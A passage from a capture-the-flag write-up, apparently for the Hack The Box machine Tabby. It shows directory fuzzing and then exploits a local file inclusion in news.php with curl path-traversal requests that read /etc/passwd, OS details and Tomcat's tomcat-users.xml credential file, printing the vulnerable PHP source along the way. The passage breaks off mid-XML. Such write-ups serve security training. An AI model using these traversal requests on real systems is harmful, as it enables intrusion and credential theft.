/home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Extensions       : .txt .html .php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response status: 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index.php               [Status: 200, Size: 14175, Words: 2135, Lines: 374]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news.php                [Status: 200, Size: 0, Words: 1, Lines: 1]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.                       [Status: 200, Size: 14175, Words: 2135, Lines: 374]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [153068/153068] :: Job [1/1] :: 773 req/sec :: Duration: [0:03:18] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s try to do something with <code>news.php</code>.</p><p>If we check the menu on the main page, we can see that <code>NEWS</code> have the following
link: <a href="http://megahosting.htb/news.php?file=statement" target="_blank" rel="noopener noreferrer">http://megahosting.htb/news.php?file=statement</a></p><p>Let&#x27;s add the local domain entries:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts| grep 194</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.194 tabby.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.194 megahosting.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The link does look like LFI vulnerable.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-exploitation-lfi">HTTP exploitation: LFI<a href="#http-exploitation-lfi" class="hash-link" aria-label="Direct link to HTTP exploitation: LFI" title="Direct link to HTTP exploitation: LFI">​</a></h2><p>Let&#x27;s confirm the LFI:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl http://megahosting.htb/news.php\?file\=../../../../../../etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:x:0:0:root:/root:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:x:4:65534:sync:/bin:/bin/sync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tomcat:x:997:997::/opt/tomcat:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash:x:1000:1000:clive:/home/ash:/bin/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can also read the source code of this page:
<a href="http://megahosting.htb/news.php?file=../news.php" target="_blank" rel="noopener noreferrer">http://megahosting.htb/news.php?file=../news.php</a></p><div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$file = $_GET[&#x27;file&#x27;];</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$fh = fopen(&quot;files/$file&quot;,&quot;r&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">while ($line = fgets($fh)) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  echo($line);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fclose($fh);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s try to access the tomcat manager of the Tomcat server on prot 8080:
<a href="http://10.10.10.194:8080/manager/html" target="_blank" rel="noopener noreferrer">http://10.10.10.194:8080/manager/html</a></p><p>No luck with default credentials, but since we have a LFI we may try to read
the configuration file.</p><p>Let&#x27;s check on which OS we are before.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl &#x27;http://megahosting.htb/news.php?file=../../../../../../../etc/os-release&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NAME=&quot;Ubuntu&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION=&quot;20.04 LTS (Focal Fossa)&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ID=ubuntu</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ID_LIKE=debian</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PRETTY_NAME=&quot;Ubuntu 20.04 LTS&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION_ID=&quot;20.04&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HOME_URL=&quot;https://www.ubuntu.com/&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION_CODENAME=focal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">UBUNTU_CODENAME=focal</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we search the tomcat package for Ubuntu focal (20.04) we find it&#x27;s in
<a href="https://packages.ubuntu.com/search?keywords=tomcat&amp;searchon=names&amp;suite=focal&amp;section=all" target="_blank" rel="noopener noreferrer">version 9</a>.</p><p>PS: <a href="http://megahosting.htb:8080/" target="_blank" rel="noopener noreferrer">http://megahosting.htb:8080/</a> also discloses the tomcat version.</p><p>The config file storing the manager credentials is
<code>$CATALINA_HOME/conf/tomcat-users.xml</code>.</p><p>On Ubuntu <code>$CATALINA_HOME</code> = <code>/usr/share/tomcat{x}</code> where <code>{x}</code> is the version
of tomcat eg. 7, 8, 9, etc. Also the config folder is <code>/etc/tomcat{x}</code>.</p><p>But <code>/etc/tomcat{x}</code> may be for older versions only.</p><p>Let&#x27;s check the files list for <code>tomcat9</code> for ubuntu:
<a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist" target="_blank" rel="noopener noreferrer">https://packages.ubuntu.com/focal/all/tomcat9/filelist</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/cron.daily/tomcat9</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/rsyslog.d/tomcat9.conf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/tomcat9/policy.d/01system.policy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/tomcat9/policy.d/02debian.policy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/tomcat9/policy.d/03catalina.policy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/tomcat9/policy.d/04webapps.policy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/tomcat9/policy.d/50local.policy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/lib/systemd/system/tomcat9.service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/sysusers.d/tomcat9.conf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/tmpfiles.d/tomcat9.conf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/libexec/tomcat9/tomcat-start.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/libexec/tomcat9/tomcat-update-policy.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/doc/tomcat9/README.Debian</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/doc/tomcat9/changelog.Debian.gz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/doc/tomcat9/copyright</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9-root/default_root/META-INF/context.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9-root/default_root/index.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/default.template</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/catalina.properties</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/context.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/jaspic-providers.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/logging.properties</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/server.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/tomcat-users.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/etc/web.xml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/tomcat9/logrotate.template</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/var/lib/tomcat9/conf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/var/lib/tomcat9/logs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/var/lib/tomcat9/work</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So it&#x27;s seems ubuntu mapped the files differently than the apache defaults,
so it won&#x27;t be <code>$TOMCAT_HOME/conf/tomcat-users.xml</code> but
<code>$TOMCAT_HOME/etc/tomcat-users.xml</code>.</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl &#x27;http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token prolog" style="color:rgb(189, 147, 249)">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  contributor license agreements.  See the NOTICE file distributed with</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  this work for additional information regarding copyright ownership.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  the License.  You may obtain a copy of the License at</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="display:inline-block;color:rgb(98, 114, 164)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">      http://www.apache.org/licenses/LICENSE-2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="display:inline-block;color:rgb(98, 114, 164)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  Unless required by applicable law or agreed to in writing, software</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  See the License for the specific language governing permissions and</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  limitations under the License.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">tomcat-users</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">xmlns</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">http://tomcat.apache.org/xml</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag" style="color:rgb(255, 121, 198)">              </span><span class="token tag attr-name namespace" style="color:rgb(241, 250, 140)">xmlns:</span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">xsi</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">http://www.w3.org/2001/XMLSchema-instance</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag" style="color:rgb(255, 121, 198)">              </span><span class="token tag attr-name namespace" style="color:rgb(241, 250, 140)">xsi:</span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">schemaLocation</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">http://tomcat.apache.org/xml tomcat-users.xsd</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag" style="color:rgb(255, 121, 198)">              </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">version</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">1.0</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  NOTE:  By default, no user is included in the &quot;manager-gui&quot; role required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  you must define such a user - the username and password are arbitrary. It is</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  strongly recommended that you do NOT use one of the users in the commented out</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  section below since they are intended for use with the examples web</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  application.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  NOTE:  The sample user and role entries below are intended for use with the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  examples web application. They are wrapped in a comment and thus are ignored</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  when reading this file. If you wish to configure these users for use with the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  them. You will also need to set the passwords to something appropriate.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  &lt;role rolename=&quot;tomcat&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  &lt;role rolename=&quot;role1&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">  &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">--&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">role</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">rolename</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">admin-gui</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">role</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">rolename</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">manager-script</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token 